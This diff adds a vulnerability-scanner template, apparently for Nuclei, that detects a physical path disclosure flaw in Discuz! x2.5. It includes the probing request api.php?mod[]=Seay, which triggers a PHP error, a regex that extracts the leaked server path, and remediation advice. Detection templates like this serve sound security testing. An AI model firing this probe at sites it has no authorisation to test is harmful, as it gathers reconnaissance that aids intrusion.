@@ -1,0 +1,32 @@
+id: Discuz-info-api
+info:
+  name: Discuz x2.5 物理路径泄露漏洞
+  author:
+  - 折跃
+  description: |-
+    Discuz! x2.5 物理路径泄露漏洞
+    Discuz!是一套通用的社区论坛软件系统。
+
+    Discuz! x2.5存在物理路径泄露漏洞。
+  severity: low
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：
+    http://discuz.net/
+
+    临时修复方案：
+    1、屏蔽报错信息输出
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==200
+    - "regex('<b>Warning</b>:[^\r\n]+or an integer in <b>([^<]+)api\\.php</b> on line
+      <b>(\\d+)</b>',body)"
+  path:
+  - '{{BaseURL}}/api.php?mod[]=Seay'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
